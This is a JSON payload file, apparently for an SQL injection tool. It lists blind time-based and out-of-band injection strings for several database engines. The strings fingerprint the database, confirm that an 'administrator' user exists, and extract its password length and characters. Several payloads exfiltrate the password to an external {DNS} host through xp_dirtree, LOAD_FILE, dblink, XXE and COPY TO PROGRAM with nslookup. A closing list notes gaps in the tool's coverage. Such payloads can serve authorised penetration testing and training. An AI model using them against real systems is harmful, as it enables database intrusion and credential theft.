{
  "lists": {
    "first_test": [
      "'",
      "''"
    ],
    "database_fingerprinting": [
      "'||(SELECT '' FROM dual)||'",
      "'||(SELECT '')||'",
      "'||(SELECT '')||'",
      "'OR(SELECT '')OR'",
      "'+(SELECT '')+'"
    ],
    "time_fingerprints": [
      "'; IF (1=1) WAITFOR DELAY '0:0:5'--",
      "'; SELECT IF(1=1, SLEEP(5), 0)-- -",
      "'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--",
      "'; SELECT CASE WHEN (1=1) THEN DBMS_LOCK.SLEEP(5) ELSE NULL END FROM dual--",
      "'; SELECT CASE WHEN (1=1) THEN (WITH RECURSIVE cnt(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM cnt LIMIT 2500000) SELECT count(*) FROM cnt) ELSE 0 END--"
    ],
    "user_exists_payloads": [
      "';SELECT CASE WHEN EXISTS(SELECT 1 FROM users WHERE username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END--",
      "';SELECT IF(EXISTS(SELECT 1 FROM users WHERE username='administrator'), SLEEP(10), 0)-- -",
      "'; IF EXISTS(SELECT 1 FROM users WHERE username='administrator') WAITFOR DELAY '0:0:10'--",
      "';SELECT CASE WHEN (SELECT COUNT(*) FROM users WHERE username='administrator')>0 THEN DBMS_PIPE.RECEIVE_MESSAGE('X',10) ELSE 0 END FROM dual--",
      "';SELECT CASE WHEN ((SELECT COUNT(*) FROM users WHERE username='administrator')>0) THEN LENGTH(randomblob(50000000)) ELSE 0 END--"
    ],
    "password_length_gt2": [
      "';SELECT CASE WHEN (username='administrator' AND LENGTH(password)>{lenght}) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--",
      "';SELECT IF((username='administrator' AND LENGTH(password)>{lenght}), SLEEP(10), 0)-- -",
      "'; IF EXISTS(SELECT 1 FROM users WHERE username='administrator' AND LEN(password)>{lenght}) WAITFOR DELAY '0:0:10'--",
      "';SELECT CASE WHEN (SELECT LENGTH(password) FROM users WHERE username='administrator')>{lenght} THEN DBMS_PIPE.RECEIVE_MESSAGE('X',10) ELSE 0 END FROM dual--",
      "';SELECT CASE WHEN ((SELECT LENGTH(password) FROM users WHERE username='administrator')>{lenght}) THEN LENGTH(randomblob(50000000)) ELSE 0 END--"
    ],
    "intruder_substring_raw": [
      "';SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,{position},1)='{char}') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--",
      "';SELECT IF((username='administrator' AND SUBSTRING(password,{position},1)='{char}'), SLEEP(10), 0)-- -",
      "'; IF EXISTS(SELECT 1 FROM users WHERE username='administrator' AND SUBSTRING(password,{position},1)='{char}') WAITFOR DELAY '0:0:10'--",
      "';SELECT CASE WHEN (SELECT SUBSTR(password,{position},1) FROM users WHERE username='administrator')='{char}' THEN DBMS_PIPE.RECEIVE_MESSAGE('X',10) ELSE 0 END FROM dual--",
      "';SELECT CASE WHEN ((SELECT SUBSTR(password,{position},1) FROM users WHERE username='administrator')='{char}') THEN LENGTH(randomblob(50000000)) ELSE 0 END--"
    ],
    "oast": [
      "'; CREATE EXTENSION IF NOT EXISTS dblink; SELECT dblink_connect('host='||(SELECT encode(password::bytea,'hex') FROM users WHERE username='admin')||'.{DNS} user=test dbname=test');--",
      "'; COPY (SELECT '') TO PROGRAM 'nslookup $(SELECT encode(password::bytea,'hex')).{DNS}'--",
      "'; DECLARE @p VARCHAR(255); SET @p=(SELECT password FROM users WHERE username='admin'); EXEC('master..xp_dirtree ''\\'+@p+'.{DNS}\\a''')--",
      "'; IF (SELECT COUNT(*) FROM users WHERE username='admin' AND password LIKE 'a%')=1 WAITFOR DELAY '0:0:5'--",
      "' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT HEX(password) FROM users WHERE username='admin'),'.{DNS}\\a'))--",
      "' UNION SELECT 1 INTO OUTFILE '\\\\{DNS}\\a' LINES TERMINATED BY (SELECT password FROM users WHERE username='admin')--",
      "' UNION SELECT EXTRACTVALUE(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM \"http://{DNS}/\"> %remote;]>'),'/l') FROM dual--",
      "' UNION SELECT UTL_INADDR.get_host_address('{DNS}') FROM dual--",
      "' UNION SELECT 1 WHERE load_extension('\\\\{DNS}\\a')--"
    ],
    "oast_pay": [
      "' UNION SELECT EXTRACTVALUE(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM \"http://'||(SELECT password FROM users WHERE username='administrator')||'.{DNS}/\"> %remote;]>'),'/l') FROM dual--",
      "'; DECLARE @p NVARCHAR(4000); SET @p = (SELECT password FROM users WHERE username='administrator'); EXEC('master..xp_dirtree ''\\'+@p+'.{DNS}\\a''')--",
      "' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users WHERE username='administrator' LIMIT 1),'.{DNS}\\a'))--",
      "' UNION SELECT load_extension('\\\\'||(SELECT hex(password) FROM users WHERE username='administrator')||'.{DNS}\\a')--"
    ],
    "blind_sql_time_based": [
      "'; IF (LEN((SELECT {object} FROM {table} WHERE Username='Administrator')) > {lenght}) WAITFOR DELAY '0:0:{delay}'--",
      "' AND IF(LENGTH((SELECT {object} FROM {table} WHERE Username='Administrator')) > {lenght}, SLEEP({delay}), 0)-- -",
      "' AND CASE WHEN LENGTH((SELECT {object} FROM {table} WHERE Username='Administrator')) > {lenght} THEN pg_sleep({delay}) ELSE 0 END--",
      "' AND CASE WHEN LENGTH((SELECT Password FROM Users WHERE Username='Administrator')) > 10 THEN DBMS_LOCK.SLEEP(5) ELSE NULL END = 0--"
    ],
    "payload_weaknesses": [
      "Missing coverage for some scenarios: Excluded commented payloads (e.g., payloads_conditional_error, cast_payloads) that could be useful for error-based or CAST-based SQL injection tests.",
      "OAST complexity: Payloads like oast and oast_pay require an external DNS server (e.g., Interactsh) to capture data, making them unusable without proper setup.",
      "Lack of advanced filtering: The program lacks automatic filtering of payloads by database (e.g., MySQL) or type (e.g., time-based), which could improve usability.",
      "SQLite limitations: Some SQLite payloads (e.g., load_extension) require specific configurations (extensions enabled) and may not work in standard environments."
    ]
  }
}